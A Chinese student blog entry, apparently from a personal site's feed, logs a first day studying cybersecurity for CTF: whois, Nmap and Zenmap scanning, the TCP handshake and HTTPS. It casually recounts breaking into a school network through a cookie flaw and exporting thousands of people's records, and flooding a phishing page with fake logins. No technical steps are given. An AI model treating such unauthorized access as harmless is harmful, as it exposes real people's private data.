    <content type="html"><![CDATA[<p>12月5日 志愿者节<br>无指向性地看了一些合天网络安全实验室的知识</p><span id="more"></span><h4 id="启蒙"><a href="#启蒙" class="headerlink" title="启蒙"></a>启蒙</h4><p>第一次看合天<br>1.5倍速去粗略看了一下<br><a href="https://imgchr.com/i/DLrsij"><img src="https://s3.ax1x.com/2020/12/05/DLrsij.png" alt="DLrsij.png"></a><br>让我感触最深的应该是说到“社会安全学“这门<del>学科</del>？</p><h5 id="我与网络安全"><a href="#我与网络安全" class="headerlink" title="我与网络安全"></a>我与网络安全</h5><p>由于曾经初中有一个集成系统<br>当时年轻比较喜欢探索 最后用fiddler抓出了某些东西 最后拿到了这个<br>在这里就不写具体的操作过程了，<strong>总之没有sql注入</strong><br><a href="https://imgchr.com/i/DLsqhj"><img src="https://s3.ax1x.com/2020/12/05/DLsqhj.png" alt="DLsqhj.png"></a><br><a href="https://imgchr.com/i/DLsO9s"><img src="https://s3.ax1x.com/2020/12/05/DLsO9s.png" alt="DLsO9s.png"></a><br>一个小小的cookie漏洞 <del>参数投递漏洞</del>（我也不知道这样说对不对，当时就是因为在aspx到php的参数出现的问题产生的漏洞）就控制了整一个校园网系统<br>几千人的个人信息 就这样（被一个高中生）轻易导出<br>那时候就感受到了许多地方真的不重视安全<br>同时我也了解到了某些学籍信息不敢链接外网的原因（至少有安全意识的会这样做）</p><h5 id="我与钓鱼人"><a href="#我与钓鱼人" class="headerlink" title="我与钓鱼人"></a>我与钓鱼人</h5><p>说道启蒙 我想到了一些”外行人“ 不论是钓鱼 还是其他的他们统一都说是”病毒“<br>我还想到了当时的QQ空间的”相册钓鱼“<br>当时就觉得他们很卑鄙 做这种事情 写了一个脚本给对方发送了100000个post请求 参数是随机生成的QQ号和密码<br>这就变得很有趣了。</p><h5 id="我与暗网"><a href="#我与暗网" class="headerlink" title="我与暗网"></a>我与暗网</h5><p>暗网警告！<br>与我较好的一位”伙伴“，三年前在暗网用0.0*个比特币购买到了自己大学本科、研究生的学籍信息 （包括GPA、甚至选课信息等等）。</p><h5 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h5><p>所以这些经历使我产生许多兴趣，加入了CTF。<br>希望能成为一门白客 为安全事业贡献一份力。</p><h4 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h4><h5 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h5><p>emmmm，就查一下域名信息啥的，之前在新网等域名托管商注册个人域名也要求填本人的个人信息。</p><h5 id="Nmap网络扫描"><a href="#Nmap网络扫描" class="headerlink" title="Nmap网络扫描"></a>Nmap网络扫描</h5><p>遇到没遇到过的专业技能了</p><h6 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h6><p><a href="https://imgchr.com/i/DLgCE8"><img src="https://s3.ax1x.com/2020/12/05/DLgCE8.png" alt="DLgCE8.png"></a><br>看来需要先学习基础的理论<br>说到三次握手 我想到了http与https，我想我需要再了解一下</p><h6 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP/HTTPS"></a>HTTP/HTTPS</h6><p>相对于HTTP，HTTPS更安全，这里有关CA证书、有关RSA，在这里不再赘述。<a href="https://blog.csdn.net/qq_35642036/article/details/82788421">在这里贴上链接</a>。<br>这里附上”三次握手“<a href="https://zhuanlan.zhihu.com/p/86426969">细节详解</a>。</p><h6 id="Zenmap图形基本应用"><a href="#Zenmap图形基本应用" class="headerlink" title="Zenmap图形基本应用"></a>Zenmap图形基本应用</h6><p>就是有点像”假黑客“学习一些基础的内容，新建了的模拟机，在模拟机里面进行一系列的扫描。<br>包括整网段的扫描等。但是问题又来了，这只是在理想环境的测试，那在真实的环境下呢？在具有防火墙、具有过滤拦截下的渗透又是怎么样的呢？需要等待明天解答。</p><h6 id="nmap命令行的使用"><a href="#nmap命令行的使用" class="headerlink" title="nmap命令行的使用"></a>nmap命令行的使用</h6><p><a href="https://imgchr.com/i/DLId9f"><img src="https://s3.ax1x.com/2020/12/05/DLId9f.png" alt="DLId9f.png"></a><br>看了很多工具的使用，接触到如SYN\ACK等不会的名词。玩完命令行觉得：要走的路还好长好长<br>顺便把<a href="https://blog.csdn.net/yuanyuan1900/article/details/105991862">命令行的语法格式</a>学了一下 </p><h4 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h4><p>觉得这样的学习 和实操还有很远 CTF更多的我认为应该是实操<br>在后面，我想我需要通过更多的实操，去提供水平，同时也要有基础储备。<br><em>希望多天后的我，看到上面自己写的东西，会觉得幼稚。</em></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;12月5日 志愿者节&lt;br&gt;无指向性地看了一些合天网络安全实验室的知识&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
  </entry>
  
</feed>
